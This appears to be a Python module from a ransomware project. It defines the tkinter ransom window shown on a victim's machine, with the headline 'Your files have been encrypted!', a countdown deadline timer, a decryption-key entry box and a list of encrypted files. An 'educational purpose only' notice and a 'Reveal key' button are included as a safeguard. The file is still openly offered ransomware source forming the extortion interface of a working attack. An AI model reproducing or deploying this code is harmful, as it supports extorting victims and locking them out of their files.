from tkinter import *
from base64 import b64decode, b64encode
from ..fileshandler import Decryptor
from .fileslist import FilesList

TITLE_MESSAGE = "Your files have been encrypted!"
BG_COLOR = "#800000"
TEXT_COLOR = "white"

class Timer:
    """
    Attack's time limit timer
    """
    def __init__(self):
        self.hours = 0
        self.minutes = 0
        self.seconds = 0

    def init(self, hours, minutes, seconds):
        """
        Initiates the timer
        :param hours: int
        :param minutes: int
        :param seconds: int
        """
        self.hours = hours
        self.minutes = minutes
        self.seconds = seconds


class UserMessage:
    """
    The ransom message that will be displayed on the target's machine when using GUI option
    """
    def __init__(self, message, files, total_time, key, remaining_time=None):
        """
        :param message: str; the actual message
        :param files: list; encrypted files list
        :param total_time: int; total time limit
        """
        self.message = message
        self.total_time = total_time
        self.files = files
        self.timer = Timer()
        if remaining_time:
            self.__init_timer_manually(remaining_time)
        else:
            self.timer.init(self.total_time, 0, 0)
        self.key = key
        self.decrypting = False
        self.window = Tk()
        self.__set_gui()

    def __set_gui(self):
        """
        Sets GUI components
        """
        self.__set_window()
        self.__set_message()
        self.__set_decryption_elements()
        self.__set_timer()
        self.__set_safety_option()
        self.window.mainloop()

    def __set_window(self):
        """
        Sets window component
        """
        self.window.title("Ransomware attack")
        self.window.geometry('840x500')
        self.window.configure(bg=BG_COLOR)
        title = Label(self.window, text=TITLE_MESSAGE, font=("Arial Bold", 25), fg=TEXT_COLOR, bg=BG_COLOR)
        title.place(x=15, y=0)

    def __set_message(self):
        """
        Sets ransom message
        """
        text = Text(self.window, wrap=WORD, bg="white", fg="black", height=20)
        text.place(x=15, y=50)
        text.insert(INSERT, self.message)
        text.config(state=DISABLED)

    def __init_timer_manually(self, time):
        hours, minutes, seconds = time.split(':')
        self.timer.init(int(float(hours)), int(float(minutes)), int(float(seconds)))

    def __set_timer(self):
        """
        Sets the timer representing deadline's elapsed time
        """
        timer_frame = LabelFrame(self.window, text="Time left: ", bg=BG_COLOR)
        timer_frame.place(x=675, y=50)
        self.timer_lbl = Label(timer_frame, text="00:00:00", font=("Arial Bold", 25), bg=BG_COLOR)
        self.timer_lbl.pack()
        #self.timer.init(self.total_time, 0, 0)
        self.__run_timer()

    def __run_timer(self):
        """
        Runs deadline's timer
        """
        self.timer_lbl.config(text='{:02d}:{:02d}:{:02d}'.format(self.timer.hours, self.timer.minutes, self.timer.seconds))
        if self.timer.seconds == 0:
            self.timer.seconds = 59
            self.timer.minutes -= 1
            if self.timer.minutes < 0:
                self.timer.minutes = 59
                self.timer.hours -= 1
        if self.timer.hours >= 0:
            self.timer.seconds -= 1
            if not self.decrypting:
                self.window.after(1000, self.__run_timer)
            else:
                self.timer_lbl.config(text='00:00:00')

    def __set_decryption_elements(self):
        """
        Set encryption's component's (buttons, text field, etc)
        """
        frame = LabelFrame(self.window, text="Decryption", bg=BG_COLOR, fg=TEXT_COLOR)
        frame.place(x=15, y=400)
        self.key_box = Text(frame, height=1, width=50)
        self.key_box.pack(side=LEFT, padx=(10,10))
        self.decrypt_btn = Button(frame, text="Decrypt", command=self.__decrypt)
        self.decrypt_btn.pack(side=LEFT, padx=(10,10))
        Button(frame, text="Show files", command=self.__show_files).pack(padx=5)

    def __decrypt(self):
        """
        Decrypts encrypted files when cipher key is inserted
        """
        key = self.key_box.get("1.0", "end-1c")
        self.key = b64decode(key)
        # validates key
        if len(key) >= 16:
            self.__decrypt_files()
        elif len(key) == 0:
            print ("Insert key")
        else:
            print ("key is invalid")

    def __decrypt_files(self):
        """
        Executes files decryption process
        """
        decryptor = Decryptor(self.key)
        total_files = len(self.files)
        decrypting_process_label = Label(self.window, text="Decrypting files (0/{})".format(total_files))
        decrypting_process_label.place(x=15, y=450)
        self.decrypting = True
        self.decrypt_btn["state"] = "disabled"
        for index, _file in enumerate(self.files):
            decrypting_process_label.config(text='Decrypting files ({}/{})'.format(index + 1, total_files))
            decryptor.decrypt_file(_file)

    def __show_files(self):
        """
        Displays encrypted files list
        """
        FilesList(self.files)

    def __set_safety_option(self):
        """
        Set safety components. Provides the option for instantaneous decryption and restoring the encrypted files.
        A mere simple attempt to prevent any malicious usage of the program.
        """
        text = Text(self.window, wrap=WORD, bg=BG_COLOR, fg=TEXT_COLOR, height=14, width=20)
        text.place(x=675, y=150)
        text.insert(INSERT, "This program was made for educational purpose only. Any malicious usage is not encouraged!"
                            " In case of attack, use the button below to reveal your personal key (the key will be "
                            "displayed in the decryption box).")
        text.config(state=DISABLED)
        reveal_btn = Button(self.window, text="Reveal key", command=self.__reveal_key)
        reveal_btn.place(x=700, y=380)

    def __reveal_key(self):
        """
        Reveals cipher key. used for safety option
        """
        print(b64encode(self.key))
        self.key_box.delete('1.0', END)
        self.key_box.insert(INSERT, b64encode(self.key))